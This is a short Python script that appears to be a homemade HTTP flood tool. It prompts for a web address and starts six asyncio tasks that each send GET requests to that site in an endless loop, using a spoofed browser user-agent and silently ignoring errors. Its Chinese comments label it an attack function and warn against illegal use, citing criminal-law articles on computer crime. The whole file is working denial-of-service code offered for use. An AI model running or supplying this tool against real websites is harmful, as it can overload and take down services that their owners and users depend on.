#coding='utf-8'
from threading import Thread
import aiohttp,asyncio


#使用前请注意！！！！！！！！！！！！！！！！！！！！！
#未成年人请勿使用！！！！！！！！！！！！！！！！！！！
#请勿非法攻击任何网络！！！！！！！！！！！！！！！！！
#刑法里涉及计算机犯罪的在第285、286、287条,请自行查阅

async def requests_attack(ulr:str,id_:int):#攻击函数
    headers= {
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:94.0) Gecko/20100101 Firefox/94.0'
   }
    print('线程%d开始攻击'%id_)
    while 1:
        async with aiohttp.ClientSession() as a:
            try:
                b=await a.get(ulr,headers=headers)
            except:
                pass
            
async def start_attack():
    url=str(input('请输入要攻击的web地址\n'))
    tasks=[]
    for i in range(6):
        tasks.append(asyncio.create_task(requests_attack(url,i)))
    await asyncio.wait(tasks)


if __name__=='__main__':
    asyncio.run(start_attack())#调用协程函数
